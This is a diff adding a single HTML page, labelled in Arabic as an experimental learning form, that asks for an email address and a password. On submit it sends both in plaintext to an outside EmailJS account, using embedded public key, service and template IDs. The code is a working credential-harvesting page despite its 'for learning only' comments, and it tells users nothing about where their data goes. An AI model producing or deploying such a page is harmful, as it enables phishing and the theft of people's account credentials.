@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>نموذج مراسلة تجريبي</title>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<style>
+  body {
+    font-family: "Cairo", sans-serif;
+    background-color: #0d1117;
+    color: #e6edf3;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  .container {
+    background-color: #161b22;
+    padding: 2rem;
+    border-radius: 12px;
+    box-shadow: 0 0 15px rgba(255,255,255,0.1);
+    width: 90%;
+    max-width: 400px;
+    position: relative;
+  }
+  input, button {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: none;
+    border-radius: 6px;
+    font-size: 1rem;
+  }
+  input {
+    background: #21262d;
+    color: #e6edf3;
+  }
+  button {
+    background-color: #238636;
+    color: #fff;
+    cursor: pointer;
+    transition: background 0.3s;
+  }
+  button:hover {
+    background-color: #2ea043;
+  }
+  .alert {
+    display: none;
+    position: absolute;
+    top: -50px;
+    left: 0;
+    right: 0;
+    padding: 10px;
+    text-align: center;
+    border-radius: 8px;
+    font-weight: bold;
+  }
+  .alert.success {
+    background-color: #198754;
+    color: white;
+  }
+  .alert.error {
+    background-color: #dc3545;
+    color: white;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div id="alertBox" class="alert"></div>
+  <form id="form">
+    <input type="email" id="email" name="email" placeholder="البريد الإلكتروني" required />
+    <input type="password" id="password" name="password" placeholder="كلمة المرور (تجريبية)" required />
+    <button type="submit">إرسال البيانات</button>
+  </form>
+</div>
+
+<script>
+  // تهيئة EmailJS (تجريبي للتعلّم فقط)
+  (function(){
+    emailjs.init("HpcENn9ZoQ6n-2B2n");
+  })();
+
+  const form = document.getElementById("form");
+  const alertBox = document.getElementById("alertBox");
+
+  form.addEventListener("submit", function(e){
+    e.preventDefault();
+
+    const params = {
+      email: document.getElementById("email").value,
+      password: document.getElementById("password").value, // فقط للتجربة
+    };
+
+    emailjs.send("service_zcd4aaf", "template_9s8ep4a", params)
+      .then(() => {
+        showAlert("✅ تم إرسال البيانات بنجاح (تجريبي)", true);
+        form.reset();
+      })
+      .catch(() => {
+        showAlert("❌ حدث خطأ أثناء الإرسال", false);
+      });
+  });
+
+  function showAlert(msg, success) {
+    alertBox.textContent = msg;
+    alertBox.className = "alert " + (success ? "success" : "error");
+    alertBox.style.display = "block";
+    setTimeout(()=> alertBox.style.display="none", 3000);
+  }
+</script>
+
+</body>
+</html>
+
